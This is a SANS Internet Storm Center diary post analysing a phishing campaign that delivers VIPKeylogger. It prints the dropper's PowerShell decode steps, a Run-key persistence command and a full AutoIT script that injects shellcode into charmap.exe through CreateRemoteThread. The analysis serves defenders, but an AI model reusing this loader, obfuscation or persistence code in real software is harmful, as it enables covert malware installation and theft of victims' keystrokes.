---
title: AutoIT Payload Injector , (Tue, Jul 28th)
url: https://isc.sans.edu/diary/rss/33192
source: SANS Internet Storm Center, InfoCON: green
date: 2026-07-28
fetch_date: 2026-07-29T05:04:18.157343
---

# AutoIT Payload Injector , (Tue, Jul 28th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/33188)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

# [AutoIT Payload Injector](/forums/diary/AutoIT%2BPayload%2BInjector/33192/)

**Published**: 2026-07-28. **Last Updated**: 2026-07-28 07:42:27 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/AutoIT%2BPayload%2BInjector/33192/#comments)

For a long time, AutoIT[[1](https://www.autoitscript.com/site/)] has been pretty common in the malware ecosystem. Threat actors still use it because it’s easy to write and powerful. Indeed, it can perform all the required actions to inject a payload into a remote process as you’ll see below.

Since last week, I detected a wave of similar emails that deliver the same kind of payload. The example I'll cover started with a fake bank email containing a RAR archive ( "Bank\_account\_details.rar" - SHA256:5c4ca58e41c009c664a7134df12b0fdc0815f572e117fe67ca35582f19d9deab). The archive contains a VBS script (SHA256:f88d9094a90f7000a3fb2cd7c981e03357ce2b39df9de5ee1d0742e619e3860f)

This first script is pretty simple: it decodes a Base64 payload, dumps it on disk with a random name and invokes a PowerShell interpreter to decompress it (I beautified the script a bit):

```

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "
$in='C:\Users\cape2\AppData\Local\Temp\tmp656234.bat.gz';
$out='C:\Users\cape2\AppData\Local\Temp\tmp656234.bat';
$fs=New-Object IO.FileStream($in,[IO.FileMode]::Open);
$gz=New-Object IO.Compression.GzipStream($fs,[IO.Compression.CompressionMode]::Decompress);
$ms=New-Object IO.MemoryStream;$gz.CopyTo($ms);
$gz.Close();
$fs.Close();
[IO.File]::WriteAllBytes($out,$ms.ToArray());
Remove-Item $in"
```

Once unzipped, the VBS will execute the dumped script. Another PowerShell will be invoked to dump three new files on disk:

* "vijewyufveonabghulluonouceyasi.exe"
* "wwman"
* "Ennnn"

These files are Base64 encoded and XOR with the keys 0x02 and 0x3D:

```

$base64Bytes = [System.Convert]::FromBase64String($xkKnE6Nw3vPM)
$key2 = [int] 2
$recoveredBytes2 = [Array]::CreateInstance([byte], $base64Bytes.Length)
for ($i = 0; $i -lt $base64Bytes.Length; $i++)
{
    $recoveredBytes2[$i] = $base64Bytes[$i] -bxor $key2
}
$File2OutputPath = Join-Path $TargetFolder "vijewyufveonabghulluonouceyasi.exe"
[System.IO.File]::WriteAllBytes($File2OutputPath, $recoveredBytes2)
```

PowerShell will then invoke the following command:

```

“C:\Users\REM\AppData\Roaming\SetupFiles\vijewyufveonabghulluonouceyasi.exe” “C:\Users\REM\AppData\Roaming\SetupFiles\wwmaw”
```

Persistence is added via a classic Run key:

```

reg add HKCU\...\CurrentVersion\Run /v Windows32 /t REG_SZ /d "[...]\vijewyufveonabghulluonouceyasi.exe" "[...]\wwmaw" Start-Process vijewyufveonabghulluonouceyasi.exe -ArgumentList wwmaw
```

vijewyufveonabghulluonouceyasi.exe is an AutoIT3 interpreter (SHA256: bdd2b7236a110b04c288380ad56e8d7909411da93eed2921301206de0cb0dda1)

“wwman” is the AutoIT script that will perform the injection of the shellcode stored in Ennnn:

```

#NoTrayIcon

Func _O($s)
    Local $d = ""
    For $i = 1 To StringLen($s) Step 2
        $d &= Chr(Dec(StringMid($s, $i, 2)))
    Next
    Return $d
EndFunc

Global $V_01 = ("\Ennnn")
Global $V_02 = ("C:\Windows\Syswow64\charmap.exe")
Global $V_03 = _O("6B65726E656C33322E646C6C")
Global $V_04 = _O("4F70656E50726F63657373")
Global $V_05 = _O("5669727475616C416C6C6F634578")
Global $V_06 = _O("577269746550726F636573734D656D6F7279")
Global $V_07 = _O("43726561746552656D6F7465546872656164")
Global $V_08 = _O("436C6F736548616E646C65")
Global $T_H = _O("68616E646C65"), $T_D = _O("64776F7264"), $T_B = _O("626F6F6C"), $T_P = _O("707472")
Global $T_UP = _O("756C6F6E675F707472"), $T_S = _O("7374727563742A"), $T_DP = _O("64776F72642A")
Global $C_A = "0x1F0FFF", $C_B = "0x3000", $C_C = "0x40"

Local $F_P = @ScriptDir & $V_01
Local $F_H = FileOpen($F_P, 16)
Local $B_D = FileRead($F_H)
FileClose($F_H)

Local $B_L = BinaryLen($B_D)
If $B_L = 0 Then Exit

Local $S_M = DllStructCreate(_O("627974655B") & $B_L & _O("5D"))
DllStructSetData($S_M, 1, $B_D)
For $i = 1 To $B_L
    DllStructSetData($S_M, 1, BitXOR(DllStructGetData($S_M, 1, $i), 236), $i)
Next

Local $P_I = Run($V_02, "", @SW_HIDE)
Local $P_H = DllCall($V_03, $T_H, $V_04, $T_D, $C_A, $T_B, False, $T_D, $P_I)[0]
Local $M_A = DllCall($V_03, $T_P, $V_05, $T_H, $P_H, $T_P, 0, $T_UP, $B_L, $T_D, $C_B, $T_D, $C_C)[0]
DllCall($V_03, $T_B, $V_06, $T_H, $P_H, $T_P, $M_A, $T_S, $S_M, $T_UP, $B_L, $T_P, 0)
Local $T_H_R = DllCall($V_03, $T_H, $V_07, $T_H, $P_H, $T_P, 0, $T_UP, 0, $T_P, $M_A, $T_P, 0, $T_D, 0, $T_DP, 0)[0]

If $T_H_R Then DllCall($V_03, $T_B, $V_08, $T_H, $T_H_R)
DllCall($V_03, $T_B, $V_08, $T_H, $P_H)
```

This script will decode the shellcode (XOR key 0xEC), launch a charmap.exe, inject and launch the payload via the following API calls:

* $V\_04 : OpenProcess
* $V\_05 : VirtualAllocEx
* $V\_06 : WriteProcessMemory
* $V\_07 : CreateRemoteThread
* $V\_08 : CloseHandle

Yes, AutoIT is able to invoke any API call!

The process charmap.exe is the legitimate executable file for the Character Map utility built into Microsoft Windows. It allows you to view, select, and copy special symbols, accented characters, or unique glyphs from any installed font to your clipboard.

![](https://isc.sans.edu/diaryimages/images/isc-20260728-2(1).png)

To wrap up the infection chain:

![](https://isc.sans.edu/diaryimages/images/isc-20260728-1.png)

The shellcode will deliver a VIPKeylogger[[2](https://malpedia.caad.fkie.fraunhofer.de/details/win.vipkeylogger)] malware that will talk to cphost17[.]qhoster[.]net.

It seems that AutoIT is back on stage because I found another malware analysis report that describes the same infection path[[3](https://www.blackfog.com/medusahvnc-a-hidden-desktop/)].

[1] <https://www.autoitscript.com/site/>
[2] <https://malpedia.caad.fkie.fraunhofer.de/details/win.vipkeylogger>
[3] <https://www.blackfog.com/medusahvnc-a-hidden-desktop/>

Xavier Mertens (@xme)
Senior ISC Handler | SANS Principal Instructor | Freelance Consultant
[Xameco](https://xameco.be) | [PGP Key](https://xameco.be/pgpkey.txt)

Keywords: [charmapexe](/tag.html?tag=charmapexe) [Injection](/tag.html?tag=Injection) [VIPKeylogger](/tag.html?tag=VIPKeylogger) [Malware](/tag.html?tag=Malware) [AutoIT](/tag.html?tag=AutoIT)

[0 comment(s)](/diary/AutoIT%2BPayload%2BInjector/33192/#comments)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

* [previous](/diary/33188)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.htm...